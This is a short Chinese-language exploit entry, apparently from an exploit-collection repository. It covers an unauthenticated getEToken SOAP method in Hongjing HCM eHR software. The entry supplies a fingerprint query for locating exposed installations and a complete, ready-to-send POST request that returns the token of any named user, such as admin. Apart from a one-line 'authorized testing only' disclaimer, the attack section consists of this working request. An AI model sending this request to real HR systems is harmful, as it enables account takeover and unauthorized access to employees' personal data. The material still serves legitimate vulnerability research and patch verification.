---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM HrpService getEToken 用户枚举漏洞

## 漏洞描述

宏景HCM `/services/HrpService` SOAP 接口 `getEToken` 方法未授权即可调用，传入任意用户名（如 admin）即可获取其 token，可用于用户枚举与后续越权。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
POST /services/HrpService HTTP/1.1
Content-Type: text/xml
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Body>
      <hrp:getEToken>
         <hrp:username>admin</hrp:username>
      </hrp:getEToken>
   </soapenv:Body>
</soapenv:Envelope>
```

响应 `<ns1:getETokenResponse>` 返回该用户的 token。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
